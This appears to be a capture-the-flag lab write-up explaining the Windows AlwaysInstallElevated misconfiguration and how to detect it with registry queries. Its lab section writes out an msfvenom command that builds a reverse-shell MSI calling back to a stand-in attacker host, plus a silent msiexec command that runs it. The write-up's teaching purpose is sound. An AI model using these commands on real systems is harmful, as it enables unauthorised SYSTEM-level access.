# What is AlwaysInstallElevated?

**AlwaysInstallElevated** is a Windows Installer policy that can lead to **Privilege Escalation** when it is incorrectly configured.

Windows uses `.msi` files as **Windows Installer packages**. Normally, an installer runs according to the security context and policies that apply to the installation.

However, when the `AlwaysInstallElevated` policy is enabled in both the **user** and **computer** Registry locations, Windows Installer can install packages using elevated **system privileges**. Microsoft explicitly warns that enabling this policy can create a significant security risk.

The relevant Registry locations are:

```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

The required value is:

```
AlwaysInstallElevated
```

with:

```
REG_DWORD    1
```

Both locations must have the value set to `1` for this configuration to be exploitable.

---

# How Does It Work?

The basic idea is:

```
Low-Privileged User
        |
        v
AlwaysInstallElevated Enabled
        |
        v
Malicious MSI Package
        |
        v
Windows Installer (msiexec)
        |
        v
Elevated Execution
        |
        v
Privilege Escalation
```

The important point is that the vulnerability is **not inside the MSI format itself**.

The problem is the **Windows Installer policy configuration** that allows a non-administrative user to trigger an installation with elevated privileges.

---

# Detection

The first step is to check whether the required Registry configuration exists.

## Step 1: Check HKCU

Run:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

This checks the Windows Installer policy for the **current user**.

Look for:

```
AlwaysInstallElevated
```

A vulnerable configuration would show something similar to:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

---

## Step 2: Check HKLM

Next, check the machine-wide policy:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

This checks the Windows Installer policy for the **entire machine**.

Again, we need:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

---

## Step 3: Understand the Result

For the technique to work, both must be enabled:

```
HKCU → AlwaysInstallElevated = 1
HKLM → AlwaysInstallElevated = 1
```

Think of it as:

```
HKCU = 1
   +
HKLM = 1
   ↓
AlwaysInstallElevated
   ↓
Potentially Exploitable
```

If either one is missing or set to `0`, this Privilege Escalation technique will not work.

Microsoft documents the same requirement: the value must be set to `1` under both Registry keys.

---

# Lab


## Step 1: Enumerate the Registry

First, verify both Registry locations:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

The goal is to confirm:

```
AlwaysInstallElevated    REG_DWORD    0x1
```

in both locations.

---

## Step 2: Generate a Malicious MSI

Once the configuration has been confirmed, generate a Windows Installer package containing a Reverse Shell Payload.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```



---

## Step 3: Start the Listener

Because the Payload is a **Reverse Shell**, the attacking machine must listen for the incoming connection.

Start a Metasploit Handler configured to match the Payload.

The important settings must correspond to:

```
Payload → windows/x64/shell_reverse_tcp
LHOST   → Attacker IP
LPORT   → Listener Port
```

The Handler waits for the target machine to connect back after the MSI is executed.

---

## Step 4: Transfer the MSI

Transfer:

```
malicious.msi
```

to the Windows target.

For example:

```
C:\Windows\Temp\malicious.msi
```

The exact transfer method depends on the lab environment.

---

## Step 5: Execute the MSI

Use Windows Installer through `msiexec`:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

### Command Breakdown

#### `msiexec`

The Windows executable responsible for processing `.msi` packages.

#### `/i`

Specifies that the MSI should be installed.

#### `/quiet`

Runs the installation without normal user interaction.

#### `/qn`

Runs the installer with no graphical user interface.

Therefore:

```
msiexec /quiet /qn /i malicious.msi
```

essentially means:

> Install this MSI package silently.

---

# Why Does Privilege Escalation Occur?

The important part is what happens during the installation.

Normally:

```
User
 ↓
MSI
 ↓
Windows Installer
 ↓
User Privileges
```

With `AlwaysInstallElevated` enabled in both required Registry locations:

```
User
 ↓
Malicious MSI
 ↓
Windows Installer
 ↓
Elevated/System Privileges
 ↓
Payload Execution
```

The malicious MSI therefore provides a way to execute the Payload from an elevated Windows Installer context.

Microsoft describes this policy as causing Windows Installer to use system permissions when installing programs, and warns that non-administrative users can potentially use it to access protected locations and change their privileges.

---

# Why Did It Not Work on the TryHackMe Machine?

When you ran:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

you received:

```
ERROR: The system was unable to find the specified registry key or value.
```

This means the expected Registry path/value was not present.

Therefore, the required configuration was not available on that machine.

This is consistent with the room's note that **AlwaysInstallElevated is included for informational purposes and is not exploitable on that machine**.


---

# Key Takeaways

- **AlwaysInstallElevated** is a Windows Installer policy.
- It is stored under the Windows Installer Registry policy locations.
- The relevant value is:

```
AlwaysInstallElevated
```

- The value must be:

```
REG_DWORD = 1
```

- It must be enabled in **both `HKCU` and `HKLM`**.
- If only one is enabled, the technique does not work.
- A malicious `.msi` can then be used as the Payload delivery mechanism.
- `msiexec` is used to execute/install the MSI.
- The security issue comes from allowing a low-privileged user to trigger an installation using elevated/system privileges.
- Microsoft recommends avoiding this policy because of the security risk it creates.
